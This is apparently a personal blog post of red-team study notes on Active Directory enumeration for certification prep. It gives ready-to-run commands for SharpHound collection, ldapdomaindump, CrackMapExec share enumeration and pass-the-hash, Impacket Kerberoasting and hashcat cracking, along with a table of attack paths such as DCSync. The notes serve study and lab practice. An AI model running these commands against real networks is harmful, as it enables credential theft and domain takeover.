---
title: "Red Team Study Notes: Active Directory Enumeration"
date: 2026-03-01
draft: false
categories:
  - notes
tags:
  - study-notes
  - red-team
summary: "Personal notes on Active Directory enumeration techniques — BloodHound, LDAP queries, and common attack paths for OSCP/CRTO prep."
---

## Why AD Enumeration Matters

Most enterprise environments run Active Directory. Compromise AD and you often own the network. Enumeration is step one — you need to understand the environment before you can attack it.

## Tools

### BloodHound + SharpHound

BloodHound visualizes AD relationships and surfaces attack paths automatically.

```bash
# Run SharpHound collector (from compromised Windows host)
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip
```

Import the zip into BloodHound and run pre-built queries like "Shortest Paths to Domain Admins."

### ldapdomaindump

Useful for unauthenticated or low-priv enumeration over LDAP:

```bash
ldapdomaindump -u 'DOMAIN\user' -p 'password' dc.domain.local
```

Dumps users, groups, computers, and policies into JSON/HTML.

### CrackMapExec

```bash
# Enumerate shares
cme smb 10.10.10.0/24 -u user -p pass --shares

# Pass the hash
cme smb 10.10.10.5 -u Administrator -H <NTLM_HASH>
```

## Common Attack Paths

| Path | Description |
|------|-------------|
| Kerberoasting | Request TGS for SPNs, crack offline |
| AS-REP Roasting | Users with pre-auth disabled, no creds needed |
| ACL Abuse | GenericAll / WriteDACL rights on objects |
| DCSync | Replicate domain secrets with DS-Replication rights |

## Kerberoasting Quick Reference

```bash
# Impacket
GetUserSPNs.py domain/user:pass -dc-ip 10.10.10.5 -request

# Crack with hashcat
hashcat -m 13100 hashes.txt rockyou.txt
```

## Resources

- [HackTricks - Active Directory](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [SpecterOps BloodHound Docs](https://bloodhound.readthedocs.io/)
- CRTO course by ZeroPointSecurity
